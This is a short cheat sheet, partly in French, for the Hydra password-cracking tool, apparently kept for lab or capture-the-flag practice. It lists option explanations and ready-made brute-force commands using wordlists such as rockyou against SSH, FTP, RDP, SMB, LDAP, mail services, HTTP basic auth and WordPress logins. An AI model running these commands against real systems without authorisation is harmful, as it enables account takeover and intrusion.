# Hydra--commande

### commande

| Option          | Explanation                                                   |
| --------------- | ------------------------------------------------------------- |
| -l username     | Provide the login name                                        |
| -P WordList.txt | Specify the password list to use                              |
| server service  | Set the server address and service to attack                  |
| -s PORT         | Use in case of non-default service port number                |
| -V or -vV       | Show the username and password combinations being tried       |
| -d              | Display debugging output if the verbose output is not helping |

Exemple de commande:

#### $ hydra -l lazie -P hack/wordlists/rockyou.txt 10.10.189.75 imap

Hydra Password Cracking Cheetsheet\
The following table uses the $ip variable which can be set with the following command:

```bash
export ip 10.10.10.1
```

| Command                                                                                                                                      | Description                                          |
| -------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| hydra -P password-file.txt -v $ip snmp                                                                                                       | Hydra brute force against SNMP                       |
| hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp                                                                          | Hydra FTP known user and rockyou password list       |
| hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh                                                                                 | Hydra SSH using list of users and passwords          |
| hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh                                                                                            | Hydra SSH using a known password and a username list |
| hydra $ip -s 22 ssh -l -P big\_wordlist.txt                                                                                                  | Hydra SSH Against Known username on port 22          |
| hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V                                                                             | Hydra POP3 Brute Force                               |
| hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V                                                                                            | Hydra SMTP Brute Force                               |
| hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                                                    | Hydra attack http get 401 login with a dictionary    |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                              | Hydra attack Windows Remote Desktop with rockyou     |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                                | Hydra brute force SMB user with rockyou:             |
| hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^\&pwd=^PASS^\&wp-submit=Log In\&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
| hydra -L usernames.txt -P passwords.txt $ip smb -V -f                                                                                        | SMB Brute Forcing                                    |
| hydra -L users.txt -P passwords.txt $ip ldap2 -V -f                                                                                          | LDAP Brute Forcin                                    |
